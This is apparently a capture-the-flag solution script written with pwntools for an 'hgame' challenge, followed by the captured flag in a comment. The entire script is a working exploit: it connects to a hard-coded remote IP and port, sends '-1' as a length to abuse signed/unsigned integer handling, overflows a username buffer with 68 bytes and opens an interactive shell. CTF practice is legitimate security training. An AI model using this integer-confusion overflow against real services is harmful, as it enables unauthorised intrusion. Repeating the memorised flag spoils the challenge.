from pwn import *

conn = remote('111.230.149.72', 10001)
conn.recvuntil('length: ', drop=True)
conn.send('-1\n')
conn.recvuntil('username?', drop=True)
conn.send('@'*68 + '\n')
conn.interactive()

#hgame{Be_c4r3fu1_wHile_u5ing_1nt_And_unsigned_1nt}
